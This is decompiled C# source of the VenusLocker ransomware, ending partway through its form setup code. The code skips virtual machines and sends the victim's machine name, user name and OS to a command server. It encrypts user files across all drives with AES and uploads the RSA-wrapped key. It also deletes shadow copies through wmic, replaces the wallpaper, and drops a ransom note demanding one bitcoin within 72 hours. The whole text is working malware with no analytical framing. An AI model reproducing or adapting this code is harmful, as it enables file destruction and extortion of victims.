using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using VenusLocker.Properties;

namespace VenusLocker;

public class MainForm : Form
{
	public enum Mode : byte
	{
		online,
		offline
	}

	private const string Expired = "2017-09-30 00:00:00";

	private const string Source = "DD4BC_UAC";

	private const string ServerUrl = "http://ransom.jianclaioskdo.info/";

	private const string ServerInfoSubmit = "create.php";

	private const string ServerKeySave = "keysave.php";

	private const string BackgroundUrl = "http://i.imgur.com/rSFPH6m.jpg";

	private const string IPAPIServerUrl = "http://ip-api.com/csv?fields=country";

	private const string BTCReceivingAddress = "16jvWspVfvhjRgJhGCDETf29cjQAyNmx9G";

	private const string Email = "venuslocker@torbox3uiot6wchz.onion";

	private const string OfflineAESKey = "BGORMkj&v=u1X0O2hOybNdRvZb9SGGnm";

	private const int EncryptedBytes = 1024;

	private const int AESPasswordLength = 32;

	private const int RSAKeySize = 2048;

	private const bool isOAEP = true;

	private const string RSAPublicKeyXML = "<RSAKeyValue><Modulus>33h27lNoiA3zNWAsHEGmprf6ztXszThFMSmvh3QFh72trcyHyBZT9XccFtVcUxqH2yGW1Ary7vgjmEmkZqtYfU8S/lVOD7DxKVJlqqIxJjuVuJo0QHowCyUv0FJVQuPv7XcZAaOuuBoubgMAXv6H5J8EQ0Sw7SU7QsuZyqZv0tAXxVan1dXXa8MAjsw0d4BeZ2RAmj0hmZQI85yGyOykvggKw+ut6gL2kRGPmZnIP/Ydhnvvwnv/WFi1cymMcQsJsJ2NdWSH7oRkECoxFnxpqIcKcVxVTCXQRj2uXiiWMRGpJp0vP2uO1E7qhx64/2rAp6R5TacakBpps0OKZpu8jw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private string SingletonPath = "C:\\Users\\" + Environment.UserName + "\\UFsdGVkX1DKeRC.vluni";

	private bool FirstRun;

	private string PersonalID = "";

	private readonly ICollection<string> ExcludeFolder = new string[47]
	{
		"Program Files", "Program Files (x86)", "Windows", "Python27", "Python34", "AliWangWang", "Avira", "wamp", "Avira", "360",
		"ATI", "Google", "Intel", "Internet Explorer", "Kaspersky Lab", "Microsoft Bing Pinyin", "Microsoft Chart Controls", "Microsoft Games", "Microsoft Office", "Microsoft.NET",
		"MicrosoftBAF", "MSBuild", "QQMailPlugin", "Realtek", "Skype", "Reference Assemblies", "Tencent", "USB Camera2", "WinRAR", "Windows Sidebar",
		"Windows Portable Devices", "Windows Photo Viewer", "Windows NT", "Windows Media Player", "Windows Mail", "NVIDIA Corporation", "Adobe", "IObit", "AVAST Software", "CCleaner",
		"AVG", "Mozilla Firefox", "VirtualDJ", "TeamViewer", "ICQ", "java", "Yahoo!"
	};

	private readonly ICollection<string> FullCryptExtension = new string[56]
	{
		".txt", ".ini", ".php", ".html", ".css", ".py", ".c", ".cpp", ".cc", ".h",
		".cs", ".log", ".pl", ".java", ".doc", ".dot", ".docx", ".docm", ".dotx", ".dotm",
		".rtf", ".wpd", ".docb", ".wps", ".msg", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm",
		".xltx", ".xltm", "xlsb", ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps",
		".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm", ".class",
		".jar", ".csv", ".xml", ".dwg", ".dxf", ".asp"
	};

	private readonly ICollection<string> ValidExtension = new string[510]
	{
		".asf", ".pdf", ".xls", ".docx", ".xlsx", ".mp3", ".waw", ".jpg", ".jpeg", ".txt",
		".rtf", ".doc", ".rar", ".zip", ".psd", ".tif", ".wma", ".gif", ".bmp", ".ppt",
		".pptx", ".docm", ".xlsm", ".pps", ".ppsx", ".ppd", ".eps", ".png", ".ace", ".djvu",
		".tar", ".cdr", ".max", ".wmv", ".avi", ".wav", ".mp4", ".pdd", ".php", ".aac",
		".ac3", ".amf", ".amr", ".dwg", ".dxf", ".accdb", ".mod", ".tax2013", ".tax2014", ".oga",
		".ogg", ".pbf", ".ra", ".raw", ".saf", ".val", ".wave", ".wow", ".wpk", ".3g2",
		".3gp", ".3gp2", ".3mm", ".amx", ".avs", ".bik", ".dir", ".divx", ".dvx", ".evo",
		".flv", ".qtq", ".tch", ".rts", ".rum", ".rv", ".scn", ".srt", ".stx", ".svi",
		".swf", ".trp", ".vdo", ".wm", ".wmd", ".wmmp", ".wmx", ".wvx", ".xvid", ".3d",
		".3d4", ".3df8", ".pbs", ".adi", ".ais", ".amu", ".arr", ".bmc", ".bmf", ".cag",
		".cam", ".dng", ".ink", ".ini", ".jif", ".jiff", ".jpc", ".jpf", ".jpw", ".mag",
		".mic", ".mip", ".msp", ".nav", ".ncd", ".odc", ".odi", ".opf", ".qif", ".xwd",
		".abw", ".act", ".adt", ".aim", ".ans", ".asc", ".ase", ".bdp", ".bdr", ".bib",
		".boc", ".crd", ".diz", ".dot", ".dotm", ".dotx", ".dvi", ".dxe", ".mlx", ".err",
		".euc", ".faq", ".fdr", ".fds", ".gthr", ".idx", ".kwd", ".lp2", ".ltr", ".man",
		".mbox", ".msg", ".nfo", ".now", ".odm", ".oft", ".pwi", ".rng", ".rtx", ".run",
		".ssa", ".text", ".unx", ".wbk", ".wsh", ".7z", ".arc", ".ari", ".arj", ".car",
		".cbr", ".cbz", ".gz", ".gzig", ".jgz", ".pak", ".pcv", ".puz", ".rev", ".sdn",
		".sen", ".sfs", ".sfx", ".sh", ".shar", ".shr", ".sqx", ".tbz2", ".tg", ".tlz",
		".vsi", ".wad", ".war", ".xpi", ".z02", ".z04", ".zap", ".zipx", ".zoo", ".ipa",
		".isu", ".jar", ".js", ".udf", ".adr", ".ap", ".aro", ".asa", ".ascx", ".ashx",
		".asmx", ".asp", ".indd", ".asr", ".qbb", ".bml", ".cer", ".cms", ".crt", ".dap",
		".htm", ".moz", ".svr", ".url", ".wdgt", ".abk", ".bic", ".big", ".blp", ".bsp",
		".cgf", ".chk", ".col", ".cty", ".dem", ".elf", ".ff", ".gam", ".grf", ".h3m",
		".h4r", ".iwd", ".ldb", ".lgp", ".lvl", ".map", ".md3", ".mdl", ".nds", ".pbp",
		".ppf", ".pwf", ".pxp", ".sad", ".sav", ".scm", ".scx", ".sdt", ".spr", ".sud",
		".uax", ".umx", ".unr", ".uop", ".usa", ".usx", ".ut2", ".ut3", ".utc", ".utx",
		".uvx", ".uxx", ".vmf", ".vtf", ".w3g", ".w3x", ".wtd", ".wtf", ".ccd", ".cd",
		".cso", ".disk", ".dmg", ".dvd", ".fcd", ".flp", ".img", ".isz", ".mdf", ".mds",
		".nrg", ".nri", ".vcd", ".vhd", ".snp", ".bkf", ".ade", ".adpb", ".dic", ".cch",
		".ctt", ".dal", ".ddc", ".ddcx", ".dex", ".dif", ".dii", ".itdb", ".itl", ".kmz",
		".lcd", ".lcf", ".mbx", ".mdn", ".odf", ".odp", ".ods", ".pab", ".pkb", ".pkh",
		".pot", ".potx", ".pptm", ".psa", ".qdf", ".qel", ".rgn", ".rrt", ".rsw", ".rte",
		".sdb", ".sdc", ".sds", ".sql", ".stt", ".tcx", ".thmx", ".txd", ".txf", ".upoi",
		".vmt", ".wks", ".wmdb", ".xl", ".xlc", ".xlr", ".xlsb", ".xltx", ".ltm", ".xlwx",
		".mcd", ".cap", ".cc", ".cod", ".cp", ".cpp", ".cs", ".csi", ".dcp", ".dcu",
		".dev", ".dob", ".dox", ".dpk", ".dpl", ".dpr", ".dsk", ".dsp", ".eql", ".ex",
		".f90", ".fla", ".for", ".fpp", ".jav", ".java", ".lbi", ".owl", ".pl", ".plc",
		".pli", ".pm", ".res", ".rsrc", ".so", ".swd", ".tpu", ".tpx", ".tu", ".tur",
		".vc", ".yab", ".aip", ".amxx", ".ape", ".api", ".mxp", ".oxt", ".qpx", ".qtr",
		".xla", ".xlam", ".xll", ".xlv", ".xpt", ".cfg", ".cwf", ".dbb", ".slt", ".bp2",
		".bp3", ".bpl", ".clr", ".dbx", ".jc", ".potm", ".ppsm", ".prc", ".prt", ".shw",
		".std", ".ver", ".wpl", ".xlm", ".yps", ".1cd", ".bck", ".html", ".bak", ".odt",
		".pst", ".log", ".mpg", ".mpeg", ".odb", ".wps", ".xlk", ".mdb", ".dxg", ".wpd",
		".wb2", ".dbf", ".ai", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2",
		".dcr", ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".rwl",
		".rw2", ".r3d", ".ptx", ".pef", ".srw", ".x3f", ".der", ".pem", ".pfx", ".p12",
		".p7b", ".p7c", ".jfif", ".exif", ".docb", ".xlt", ".xltm", ".xlw", ".ppam", ".sldx",
		".sldm", ".class", ".db", ".pdb", ".dat", ".csv", ".xml", ".spv", ".grle", ".sv5",
		".game", ".slot", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".eat", ".ppj",
		".indl", ".indt", ".indb", ".inx", ".idml", ".pmd", ".xqx", ".svg", ".as3", ".as"
	};

	private TimeSpan ts = new TimeSpan(3, 0, 0, 0);

	private IContainer components;

	private Label label1;

	private PictureBox LockerPicBox;

	private Label TimeReminderLabel;

	private Label DestroyTimeLabel;

	private Timer Timer;

	private Label TimeLeftLabel;

	private Label TimerLabel;

	private Label TitleLabel;

	private TabControl tabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private Label WhatHappenLabel;

	private Label HowToDecryptLabel;

	private Label HowToPayLabel;

	private Label label5;

	private Label label4;

	private Label label3;

	private Label label2;

	private Label label8;

	private Label label7;

	private Label label6;

	private Label label10;

	private Label label9;

	private Label label12;

	private Label label11;

	private Label label13;

	private Label label16;

	private Label label15;

	private Label label14;

	private TextBox BTCAddressTextBox;

	private Label label17;

	private Label label18;

	private Label label22;

	private Label label21;

	private TextBox PersonalIDTextBox;

	private Label label20;

	private Label label23;

	private PictureBox pictureBox1;

	private Label label27;

	private Label label26;

	private Label label25;

	private Label label24;

	private LinkLabel BTCHomeLinkLabel;

	private LinkLabel GetStartLinkLabel;

	private LinkLabel BlockChainlinkLabel;

	private Label label29;

	private Label label28;

	private Label label30;

	private LinkLabel HowToBuylinkLabel;

	private LinkLabel CEXlinkLabel;

	private LinkLabel BTCDirectlinkLabel;

	private LinkLabel CoinCafelinkLabel;

	private LinkLabel LocalBitcoinslinkLabel;

	private Label label36;

	private Label label34;

	private Label label33;

	private Label label32;

	private Label label31;

	private Label label37;

	private TextBox BTCAddressTextBox2;

	private Label label19;

	private Label label38;

	private Label label39;

	private TabControl tabControl2;

	private TabPage tabPage3;

	private TabPage tabPage4;

	private Label label35;

	private Label EmailLabel;

	private Label label40;

	private LinkLabel PerfectMoneyLinkLabel;

	private Label label41;

	private LinkLabel PMBitcoinLinkLabel;

	private Label label45;

	private Label label44;

	private Label label43;

	private Label label42;

	private Label label46;

	private TextBox BTCAddressTextBox3;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public MainForm()
	{
		InitializeComponent();
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		if (CheckVM())
		{
			Application.Exit();
		}
		else if (!File.Exists(SingletonPath))
		{
			FirstRun = true;
			try
			{
				File.Create(SingletonPath);
				File.SetAttributes(SingletonPath, FileAttributes.Hidden | FileAttributes.System);
			}
			catch
			{
			}
			VenusLockerRun();
			SetWallPaper();
			MessageCreator();
			DeleteShadow();
			ShowUI();
		}
		else
		{
			Application.Exit();
		}
	}

	public bool CheckVM()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item("Manufacturer").ToString()!.ToLower();
						if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}

	public int VenusLockerRun()
	{
		DateTime now = DateTime.Now;
		DateTime t = Convert.ToDateTime("2017-09-30 00:00:00");
		if (DateTime.Compare(now, t) > 0)
		{
			return -1;
		}
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback(ValidateRemoteCertificate));
		string UserId;
		int num = SendInfo(out UserId);
		PersonalID = UserId;
		string pwd = ((num != 0) ? "BGORMkj&v=u1X0O2hOybNdRvZb9SGGnm" : CreatePassword(32));
		Disk_Encryption(pwd);
		if (num == 0)
		{
			string aESKey = AESKeyEncryptWithRSA(pwd);
			SendKey(UserId, aESKey);
		}
		else
		{
			string aESKey = "NULL";
		}
		return 0;
	}

	public int SendInfo(out string UserId)
	{
		WebClient webClient = new WebClient();
		NameValueCollection nameValueCollection = new NameValueCollection();
		try
		{
			nameValueCollection["pcname"] = Environment.MachineName.ToString();
		}
		catch
		{
			nameValueCollection["pcname"] = "unknown";
		}
		try
		{
			nameValueCollection["username"] = Environment.UserName;
		}
		catch
		{
			nameValueCollection["username"] = "unknown";
		}
		if (IP2Location(out var loc) == 0)
		{
			nameValueCollection["lang"] = "S_" + loc;
		}
		else
		{
			nameValueCollection["lang"] = "F_" + CultureInfo.InstalledUICulture.EnglishName;
		}
		string value;
		try
		{
			int major = Environment.OSVersion.Version.Major;
			int minor = Environment.OSVersion.Version.Minor;
			value = major switch
			{
				10 => "10", 
				6 => minor switch
				{
					2 => "8", 
					1 => "7", 
					_ => "Vista", 
				}, 
				5 => minor switch
				{
					2 => "2003", 
					1 => "XP", 
					_ => "2000", 
				}, 
				_ => "9x", 
			};
		}
		catch
		{
			value = "unknown";
		}
		nameValueCollection["os"] = value;
		nameValueCollection["time"] = DateTime.UtcNow.ToString();
		nameValueCollection["src"] = "DD4BC_UAC";
		using (MD5 mD = MD5.Create())
		{
			string s = nameValueCollection["pcname"] + nameValueCollection["username"] + nameValueCollection["lang"] + nameValueCollection["os"] + nameValueCollection["time"];
			byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(s));
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			nameValueCollection["userid"] = stringBuilder.ToString();
		}
		UserId = nameValueCollection["userid"];
		try
		{
			byte[] bytes = webClient.UploadValues("http://ransom.jianclaioskdo.info/create.php", "POST", nameValueCollection);
			Encoding.UTF8.GetString(bytes);
			return 0;
		}
		catch
		{
			return -1;
		}
		finally
		{
			webClient.Dispose();
		}
	}

	public int IP2Location(out string loc)
	{
		WebClient webClient = new WebClient();
		try
		{
			byte[] bytes = webClient.DownloadData("http://ip-api.com/csv?fields=country");
			string text = (loc = Encoding.UTF8.GetString(bytes));
			return 0;
		}
		catch
		{
			loc = "";
			return -1;
		}
		finally
		{
			webClient.Dispose();
		}
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider();
		while (length-- > 0)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[GetInt(rnd, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
		}
		return stringBuilder.ToString();
	}

	public int GetInt(RNGCryptoServiceProvider rnd, int max)
	{
		byte[] array = new byte[4];
		int num;
		do
		{
			rnd.GetBytes(array);
			num = BitConverter.ToInt32(array, 0) & 0x7FFFFFFF;
		}
		while (num >= max * (int.MaxValue / max));
		return num % max;
	}

	public int Disk_Encryption(string pwd)
	{
		DriveInfo[] drives;
		try
		{
			drives = DriveInfo.GetDrives();
		}
		catch
		{
			return -1;
		}
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				CurrentPath_Encryption(pwd, driveInfo.Name);
			}
		}
		return 0;
	}

	public int CurrentPath_Encryption(string pwd, string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				if (ValidExtension.Contains(fileInfo.Extension) && (fileInfo.Attributes & FileAttributes.System) != FileAttributes.System && (fileInfo.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
				{
					File_Encryption(pwd, fileInfo);
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo2 in array2)
			{
				if (!ExcludeFolder.Contains(directoryInfo2.Name) && (directoryInfo2.Attributes & FileAttributes.System) != FileAttributes.System && (directoryInfo2.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
				{
					CurrentPath_Encryption(pwd, directoryInfo2.FullName);
				}
			}
		}
		catch
		{
			return -1;
		}
		return 0;
	}

	public int File_Encryption(string pwd, FileInfo file)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(pwd);
		bytes = SHA256.Create().ComputeHash(bytes);
		try
		{
			if (FullCryptExtension.Contains(file.Extension))
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file.FullName);
				byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes, isPadding: true);
				File.WriteAllBytes(file.FullName, bytes2);
				byte[] bytes3 = Encoding.Default.GetBytes(file.Name);
				File.Move(file.FullName, file.FullName.Substring(0, file.FullName.Length - file.Name.Length) + Convert.ToBase64String(bytes3) + ".Venusf");
			}
			else
			{
				FileStream fileStream = new FileStream(file.FullName, FileMode.Open, FileAccess.ReadWrite);
				byte[] array = new byte[1024];
				fileStream.Read(array, 0, 1024);
				byte[] buffer = AES_Encrypt(array, bytes, isPadding: false);
				fileStream.Seek(0L, SeekOrigin.Begin);
				fileStream.Write(buffer, 0, 1024);
				fileStream.Close();
				byte[] bytes4 = Encoding.Default.GetBytes(file.Name);
				File.Move(file.FullName, file.FullName.Substring(0, file.FullName.Length - file.Name.Length) + Convert.ToBase64String(bytes4) + ".Venusp");
			}
		}
		catch
		{
			return -1;
		}
		return 0;
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes, bool isPadding)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		if (!isPadding)
		{
			rijndaelManaged.Padding = PaddingMode.None;
		}
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string AESKeyEncryptWithRSA(string pwd)
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.FromXmlString("<RSAKeyValue><Modulus>33h27lNoiA3zNWAsHEGmprf6ztXszThFMSmvh3QFh72trcyHyBZT9XccFtVcUxqH2yGW1Ary7vgjmEmkZqtYfU8S/lVOD7DxKVJlqqIxJjuVuJo0QHowCyUv0FJVQuPv7XcZAaOuuBoubgMAXv6H5J8EQ0Sw7SU7QsuZyqZv0tAXxVan1dXXa8MAjsw0d4BeZ2RAmj0hmZQI85yGyOykvggKw+ut6gL2kRGPmZnIP/Ydhnvvwnv/WFi1cymMcQsJsJ2NdWSH7oRkECoxFnxpqIcKcVxVTCXQRj2uXiiWMRGpJp0vP2uO1E7qhx64/2rAp6R5TacakBpps0OKZpu8jw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		byte[] bytes = Encoding.UTF8.GetBytes(pwd);
		byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
		return Convert.ToBase64String(inArray);
	}

	public void SendKey(string user, string AESKey)
	{
		WebClient webClient = new WebClient();
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection["userid"] = user;
		nameValueCollection["key"] = AESKey;
		try
		{
			byte[] bytes = webClient.UploadValues("http://ransom.jianclaioskdo.info/keysave.php", "POST", nameValueCollection);
			Encoding.UTF8.GetString(bytes);
		}
		catch
		{
		}
		finally
		{
			webClient.Dispose();
		}
	}

	public void ShowUI()
	{
		DateTime dateTime = DateTime.Now.AddDays(3.0);
		((Control)DestroyTimeLabel).set_Text(dateTime.ToString());
		((Control)BTCAddressTextBox).set_Text("16jvWspVfvhjRgJhGCDETf29cjQAyNmx9G");
		((Control)BTCAddressTextBox2).set_Text("16jvWspVfvhjRgJhGCDETf29cjQAyNmx9G");
		((Control)BTCAddressTextBox3).set_Text("16jvWspVfvhjRgJhGCDETf29cjQAyNmx9G");
		((Control)PersonalIDTextBox).set_Text(PersonalID);
		((Control)EmailLabel).set_Text("venuslocker@torbox3uiot6wchz.onion");
	}

	public int SetWallPaper()
	{
		try
		{
			string text = "C:\\Users\\" + Environment.UserName + "bg.jpg";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(new Uri("http://i.imgur.com/rSFPH6m.jpg"), text);
			SystemParametersInfo(20u, 0u, text, 3u);
			return 0;
		}
		catch
		{
			return -1;
		}
	}

	public void MessageCreator()
	{
		string path = "C:\\Users\\" + Environment.UserName + "\\Desktop\\ReadMe.txt";
		string[] contents = new string[53]
		{
			Environment.NewLine + "---------------------------------------- Venus Locker ------------------------------------" + Environment.NewLine,
			"Korean: https://hastebin.com/semoseguli.pl",
			"Japanese: https://hastebin.com/pifegafupi.scala",
			"French: https://hastebin.com/uxuxoqikon.scala",
			"Chinese: https://hastebin.com/rocukapaga.scala",
			"Italian: https://hastebin.com/igeyejigef.erl" + Environment.NewLine,
			"Unfortunately, you are hacked." + Environment.NewLine,
			"1. What happened to my files?" + Environment.NewLine,
			"Your personal files, including your photos, documents, videos and other important files on this computer, have been encrypted",
			"with RSA-2048, a strong encryption algorithm. RSA algorithm generates a public key and a private key for your computer. The",
			"public key was used to encrypt your files a moment ago. The private key is necessary for you to decrypt and recover your files.",
			"Now, your private key is stored on our secret Internet server. And there is no doubt that no one can recover your files without",
			"your private key." + Environment.NewLine,
			"For further information about RSA algorithm, please refer to https://en.wikipedia.org/wiki/RSA_(cryptosystem)" + Environment.NewLine,
			"2. How to decrypt my files?" + Environment.NewLine,
			"To decrypt and recover your files, you have to pay 1 BTC (Bitcoin) for the private key and decryption service. Please note that",
			"you have ONLY 72 HOURS to complete your payment. If your peyment do not be completed within time limit, your private key will be",
			"deleted automatically by our server. All your files will be permanently encrypted and nobody can recover them. Therefore, it is ",
			"advised that you'd better not waste your time, because there is no other way to recover your files except making a payment." + Environment.NewLine,
			"3. How to pay for my private key?" + Environment.NewLine,
			"There are three steps to make a payment and recover your files: " + Environment.NewLine,
			"1). For the security of transactions, all the payments must be completed via Bitcoin network. Thus, you need to exchange some money",
			"to 1 Bitcoin, and then send these Bitcoins to the following address." + Environment.NewLine,
			"16jvWspVfvhjRgJhGCDETf29cjQAyNmx9G" + Environment.NewLine,
			"2). Send your personal ID to our official email: venuslocker@torbox3uiot6wchz.onion" + Environment.NewLine,
			"Your personal ID is " + PersonalID + Environment.NewLine,
			"3). You will receive a decryptor and your private key to recover all your files within one working day." + Environment.NewLine,
			"4. What is Bitcoin?" + Environment.NewLine,
			"Bitcoin is an innovative payment network and a new kind of money. It is based on an open-source cryptographic protocol that is ",
			"independent of any central authority. Bitcoins can be transferred through a computer or a smartphone withour an intermediate",
			"financial institution." + Environment.NewLine,
			"5. How to make a payment with Bitcoin?" + Environment.NewLine,
			"You can make a payment with Bitcoin based on Bitcoin Wallet or Based on Perfect Money. You can choose the way that is more convenient for you." + Environment.NewLine,
			"About Based on Bitcoin Wallet" + Environment.NewLine,
			"  1) Create a Bitcoin Wallet. We recommend Blockchain.info (https://blockchain.info/)" + Environment.NewLine,
			"  2) Buy necessary amount of Bitcoins. Our recommendations are as follows.",
			"     LocalBitcoins.com -- the fastest and easiest way to buy and sell Bitcoins.",
			"     CoinCafe.com -- the simplest and fastest way to buy, sell and use Bitcoins.",
			"     BTCDirect.eu -- the best for Europe.",
			"     CEX.IO -- Visa / MasterCard",
			"     CoinMama.com -- Visa / MasterCard",
			"     HowToBuyBitcoins.info -- discover quickly how to buy and sell Bitcoins in your local currency." + Environment.NewLine,
			"  3) As mentioned above, send about 1 BTC to our Bitcoin receiving address." + Environment.NewLine,
			"  4) As mentioned above, and then, send us your personal ID via email, you will receive your private key soon." + Environment.NewLine,
			"About Based on Perfect Money" + Environment.NewLine,
			"  1) Create a Perfect Money account. (https://perfectmoney.is)" + Environment.NewLine,
			"  2) Visit to PMBitcoin.com. (https://pmbitcoin.com/btc)",
			"     input our Bitcoin receiving address in the \"Bitcoin Wallet\" textbox.",
			"     input 1 in the \"BTC\" textbox, the amount of USD will be calculated automatically.",
			"     click \"PAY\" button, then you can complete you payment with your Perfect Money account and local debit card." + Environment.NewLine,
			"6. If you have any problem, please feel free to contact us via official email." + Environment.NewLine,
			"Best Regards",
			"VenusLocker Team"
		};
		File.WriteAllLines(path, contents);
	}

	public void DeleteShadow()
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardInput = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.RedirectStandardError = true;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			process.StandardInput.WriteLine("C:\\Windows\\system32\\wbem\\wmic.exe shadowcopy delete&exit");
			process.StandardInput.AutoFlush = true;
			process.WaitForExit();
			process.Close();
		}
		catch
		{
		}
	}

	private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
	{
		return true;
	}

	private void Timer_Tick(object sender, EventArgs e)
	{
		string text = ts.Days * 24 + ts.Hours + " : " + ts.Minutes.ToString().PadLeft(2, '0') + " : " + ts.Seconds.ToString().PadLeft(2, '0');
		ts = ts.Subtract(new TimeSpan(0, 0, 1));
		((Control)TimerLabel).set_Text(text);
	}

	private void HomePage_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://bitcoin.org");
	}

	private void GetStartLinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://bitcoin.org/en/getting-started");
	}

	private void BlockChainlinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://blockchain.info/");
	}

	private void LocalBitcoinslinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://localbitcoins.com/");
	}

	private void CoinCafelinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://coincafe.com/");
	}

	private void BTCDirectlinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://btcdirect.eu/");
	}

	private void CEXlinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://cex.io/");
	}

	private void CoinMamalinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.coinmama.com/");
	}

	private void HowToBuylinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://howtobuybitcoins.info");
	}

	private void PerfectMoneyLinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://perfectmoney.is");
	}

	private void PMBitcoinLinkLabel_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://pmbitcoin.com/btc");
	}

	private void FormClosing_Clicked(object sender, FormClosingEventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		if (FirstRun)
		{
			string text = "You'd better not close this window. If you close it, you will not able to see it again. Are you sure?";
			if ((int)MessageBox.Show(text, "Warning", (MessageBoxButtons)1) == 1)
			{
				((CancelEventArgs)(object)e).Cancel = false;
			}
			else
			{
				((CancelEventArgs)(object)e).Cancel = true;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
